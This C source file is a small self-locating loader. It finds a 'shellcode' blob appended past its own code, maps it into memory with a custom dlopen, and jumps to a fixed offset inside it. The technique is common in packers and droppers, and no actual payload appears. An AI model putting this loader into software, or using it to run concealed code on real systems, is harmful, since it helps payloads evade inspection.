#define __PRINT
#include "common/common.h"
#include "load-elf/loadelf.c"

static char *fake =  "Global variable\n";

#define SELF_LENGTH 7672
#define EXTRA_LENGTH 15112

typedef void *initer(int argc, char ** argv, char ** envp);

int start() {
  long rip = get_rip() - 12; // func header
  long padding_shellcode_ptr = rip + SELF_LENGTH; // get shellcode location
  void * base = MY_DLOPEN(padding_shellcode_ptr, EXTRA_LENGTH); // load the shellcode
  initer* init_funcer = get_symbol_by_offset(base, 0x0001159);
  init_funcer(0, NULL, NULL);
  return 1; // This will never be reached due to exit in start()
}